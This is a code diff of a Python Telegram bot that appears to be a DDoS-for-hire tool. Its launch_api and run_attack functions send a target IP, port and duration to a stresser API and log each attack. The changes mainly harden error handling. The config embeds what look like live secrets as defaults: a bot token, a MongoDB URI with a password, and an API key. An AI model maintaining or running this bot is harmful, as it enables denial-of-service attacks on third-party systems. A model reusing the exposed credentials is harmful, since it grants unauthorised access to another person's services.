@@ -18,7 +18,7 @@ load_dotenv()
 BOT_TOKEN        = os.getenv("BOT_TOKEN", "8796126950:AAF_WP7YytyW45Zk7IArqzsDW5b3wGvtSDk")
 MONGODB_URI      = os.getenv("MONGODB_URI", "mongodb+srv://rocky:rocky8688@cluster0.hzpkek4.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0")
 DATABASE_NAME    = os.getenv("DATABASE_NAME", "rockybot")
-API_URL = os.getenv("API_URL", "https://kimstress.st")
+API_URL          = os.getenv("API_URL", "https://kimstress.st")
 API_KEY          = os.getenv("API_KEY", "0dd36f49b2944c9568f4384cce7027443023e09312c6dc5da606a33f16bba5d0")
 ADMIN_IDS        = [int(x.strip()) for x in os.getenv("ADMIN_IDS", "7340399575").split(",") if x.strip()]
 CHANNEL_ID       = os.getenv("CHANNEL_ID", "-1002558937048")
@@ -362,12 +362,13 @@ def launch_api(ip, port, dur):
             headers={"x-api-key": API_KEY, "Content-Type": "application/json"},
             timeout=300
         )
-        logger.info(f"Response: {r.text[:500]}")  # ADD THIS LINE
-        if r.status_code != 200:
-            return {"success": False, "error": f"HTTP {r.status_code}: {r.text}"}
-        if not r.text:
-            return {"success": False, "error": "Empty response from API"}
-        return r.json()
+        logger.info(f"API Response [{r.status_code}]: {r.text[:300]}")
+        if not r.text.strip():
+            return {"success": False, "error": f"Empty response (HTTP {r.status_code})"}
+        try:
+            return r.json()
+        except Exception:
+            return {"success": False, "error": f"HTTP {r.status_code}: {r.text[:200]}"}
     except Exception as e:
         return {"success": False, "error": str(e)}
 
@@ -379,11 +380,13 @@ def admin_only(fn):
             return
         return await fn(update, ctx, *a, **kw)
     return wrapper
+
 async def check_joined(uid, ctx):
     if not CHANNEL_ID: return True
     try:
         m = await ctx.bot.get_chat_member(chat_id=int(CHANNEL_ID), user_id=uid)
         joined = m.status in ("member", "administrator", "creator")
+        
         return joined
     except Exception as e:
         logger.error(f"Channel check: {e}")
@@ -501,7 +504,7 @@ async def run_attack(update: Update, ctx: ContextTypes.DEFAULT_TYPE, uid: int, i
             )
             db.log_attack(uid, ip, port, actual_duration, "success")
         else:
-            err = resp.get("error", resp.get("message", "Unknown error"))
+            err = str(resp.get("error", resp.get("message", "Unknown error")))[:200]
             await msg.edit_text(
                 f"❌ *ATTACK FAILED* ❌\n\n"
                 f"🎯 Target: `{ip}:{port}`\n"
